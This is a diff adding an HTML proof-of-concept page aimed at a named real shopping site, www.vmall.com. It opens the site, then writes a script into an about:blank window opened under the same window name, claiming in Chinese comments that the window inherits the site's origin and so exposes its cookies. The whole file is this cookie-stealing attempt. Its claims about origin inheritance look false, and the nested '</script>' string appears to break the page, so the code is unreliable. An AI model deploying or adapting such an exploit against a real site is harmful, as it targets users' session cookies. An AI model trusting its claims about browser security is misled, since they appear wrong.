@@ -1,0 +1,14 @@
+<html>
+  <script>
+    var victim = window.open('https://www.vmall.com');
+    // 等待加载完成后，利用空白页桥接
+    var blank = window.open('about:blank', victim.name);
+    // 在空白页中执行JS，继承 victim.com 的 Origin
+    blank.document.write(
+      '<script>' +
+      '  // 此时 origin 为 https://www.vmall.com' +
+      '  document.write(document.cookie);' +
+      '</script>'
+    );
+  </script>
+</html>
